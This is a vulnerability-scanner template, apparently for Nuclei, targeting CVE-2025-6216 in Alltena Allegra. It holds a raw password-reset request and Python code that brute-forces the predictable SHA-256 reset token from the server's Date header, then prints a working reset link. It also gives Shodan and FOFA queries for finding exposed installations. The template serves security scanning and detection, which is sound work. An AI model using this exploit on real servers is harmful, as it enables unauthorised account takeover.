code:
- engine:
  - py
  - python3
  extractors:
  - dsl:
    - '"Reset URL: " + code_response'
    type: dsl
  matchers:
  - dsl:
    - contains(code_response, "/resetPassword!confirm.action?ctk=")
    type: dsl
  source: "import requests\nimport hashlib,os\nimport time\nfrom datetime import datetime,\
    \ timezone\nfrom email.utils import parsedate_to_datetime\n\ndef get_server_time(response):\n\
    \    date_header = response.headers.get('Date')\n    if date_header:\n       \
    \ return parsedate_to_datetime(date_header)\n    return None\n\ndef main():\n\
    \    BASE_URL = os.getenv(\"BaseURL\")\n    EMAIL = os.getenv(\"email\")\n   \
    \ date_header = os.getenv(\"date_header\")\n    server_time = parsedate_to_datetime(date_header)\n\
    \    if not server_time:\n        return\n    server_time_ms = int(server_time.timestamp()\
    \ * 1000)\n    expiry_time_ms = server_time_ms + 28800000\n    base_expiry_sec\
    \ = (expiry_time_ms // 1000) * 1000\n    for ms in range(1000):\n        candidate_expiry_ms\
    \ = base_expiry_sec + ms\n        token = hashlib.sha256(str(candidate_expiry_ms).encode()).hexdigest()\n\
    \        test_url = f\"{BASE_URL}/resetPassword!confirm.action?ctk={token}\"\n\
    \        r = requests.get(test_url, allow_redirects=False)\n        if 'com.trackplus.app.logon.ResetPasswordApplication'\
    \ in r.text:\n            print(test_url)\n            return\n\nif __name__ ==\
    \ \"__main__\":\n    main()\n"
flow: http(1) && code()
http:
- extractors:
  - group: 1
    internal: true
    name: date_header
    part: header
    regex:
    - 'Date: (.*)'
    type: regex
  matchers:
  - condition: and
    type: word
    words:
    - emailSent
    - '"success":true'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /resetPassword.action HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    email={{email}}&fromAjax=true&_dc=1750669432104&perspectiveType=&appActionID=

    '
id: CVE-2025-6216
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:alltena:allegra:*:*:*:*:*:*:*:*
    cve-id: CVE-2025-6216
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-640
    epss-percentile: 0.95845
    epss-score: 0.24065
  description: 'Allegra calculateTokenExpDate Password Recovery Authentication Bypass
    Vulnerability. This vulnerability allows remote attackers to bypass authentication
    on affected installations of Allegra. Authentication is not required to exploit
    this vulnerability. The specific flaw exists within the password recovery mechanism.
    The issue results from reliance upon a predictable value when generating a password
    reset token. An attacker can leverage this vulnerability to bypass authentication
    on the application.

    '
  impact: 'An attacker can exploit this vulnerability to bypass authentication and
    gain unauthorized access to the application, potentially compromising sensitive
    data and system integrity.

    '
  metadata:
    fofa-query: icon_hash="284403119"
    max-request: 1
    product: allegra
    shodan-query: http.favicon.hash:"284403119"
    vendor: alltena
    verified: true
  name: Allegra - Authentication Bypass via Predictable Password Reset Token
  reference:
  - https://www.zerodayinitiative.com/advisories/ZDI-25-410/
  - https://alltena.com/en/resources/release-notes/release-notes-for-release-8-1-4-and-release-7-5-2
  - https://nvd.nist.gov/vuln/detail/CVE-2025-6216
  remediation: 'Upgrade Allegra to version 8.1.4 or 7.5.2 or later to fix the predictable
    password reset token vulnerability.

    '
  severity: critical
  tags: cve,cve2025,allegra,auth-bypass,predictable-token,reset,vuln
variables:
  email: admin@mydomainxxx.com
